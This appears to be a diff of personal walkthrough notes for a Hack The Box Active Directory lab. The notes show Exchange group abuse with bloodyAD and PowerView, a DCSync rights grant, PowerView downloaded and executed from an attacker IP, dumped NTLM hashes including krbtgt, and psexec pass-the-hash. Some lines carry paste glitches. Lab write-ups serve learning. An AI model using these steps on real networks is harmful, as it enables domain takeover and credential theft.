@@ -107,96 +107,6 @@ dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
  DC=htb,DC=local
 cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
 
-# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, htb.local
-dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
-cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
-
-# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, htb.local
-dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
- local
-cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
-
-# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, htb.local
-dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
- local
-cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
-
-# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, htb.local
-dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
- local
-cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
-
-# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, htb.localldap://10.10.10.161 -b "DC=htb,DC=local"
-dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
- local
-cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
-
-# HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
-
-# HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
-
-# HealthMailboxc0a90c97d4994429b15003d6a518f3f5, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
-
-# HealthMailbox670628ec4dd64321acfdf6e67db3a2d8, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
-
-# HealthMailbox968e74dd3edb414cb4018376e7dd95ba, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
-
-# HealthMailbox6ded67848a234577a1756e072081d01f, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailbox6ded67848a234577a1756e072081d01f
-
-# HealthMailbox83d6781be36b4bbf8893b03c2ee379ab, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
-
-# HealthMailboxfd87238e536e49e08738480d300e3772, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailboxfd87238e536e49e08738480d300e3772
-
-# HealthMailboxb01ac647a64648d2a5fa21df27058a24, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24
-
-# HealthMailbox7108a4e350f84b32a7a90d8e718f78cf, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
-
-# HealthMailbox0659cc188f4c4f9f978f6c2142c4181e, Monitoring Mailboxes, Microsof
- t Exchange System Objects, htb.local
-dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
- N=Microsoft Exchange System Objects,DC=htb,DC=local
-cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
-
 # Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
  htb.local
 dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
@@ -385,6 +295,26 @@ The command completed successfully.
 net group "Exchange Windows Permissions" /add ed
 The command completed successfully.
 
+//or use bloodyAD 
+└─$ bloodyAD --host 10.10.10.161 -d htb.local -u 'svc-alfresco' -p 's3rvice' add groupMember 'Exchange Windows Permissions' ed
+[+] ed added to Exchange Windows Permissions
+
+└─$ bloodyAD --host 10.10.10.161 -d htb.local -u 'svc-alfresco' -p 's3rvice' get membership ed
+
+distinguishedName: CN=Users,CN=Builtin,DC=htb,DC=local
+objectSid: S-1-5-32-545
+sAMAccountName: Users
+
+distinguishedName: CN=Domain Users,CN=Users,DC=htb,DC=local
+objectSid: S-1-5-21-3072663084-364016917-1341370565-513
+sAMAccountName: Domain Users
+
+distinguishedName: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+objectSid: S-1-5-21-3072663084-364016917-1341370565-1121
+sAMAccountName: Exchange Windows Permissions
+                                             
+
+
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user ed
 User name                    ed
 Full Name
@@ -419,14 +349,15 @@ iex(new-object net.webclient).downloadstring('http://10.10.16.5:8000, PowerView.
 iwr -uri http://10.10.16.5:8000/PowerView.ps1 -o p.ps1
 
 
-
-convertto-securestring 'password' -AsPlainText -Force
+//use powerview.ps1 to grant dcsync privi
+$pass= convertto-securestring 'password' -AsPlainText -Force
 
 $cred = New-Object System.Management.Automation.PSCredential('htb\ed', $pass)
 
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ed -Rights DCSync //this is a command in powerview.ps1
 
 
+use secretsdump Impacket to get hashes of this domain
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
@@ -436,6 +367,11 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+//bloodyad to grant dcsync
+
+└─$ bloodyAD --host 10.10.10.161 -d htb.local -u 'ed' -p 'password' add dcsync ed
+[+] ed is now able to DCSync
 
 
 └─$ impacket-psexec "Administrator"@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
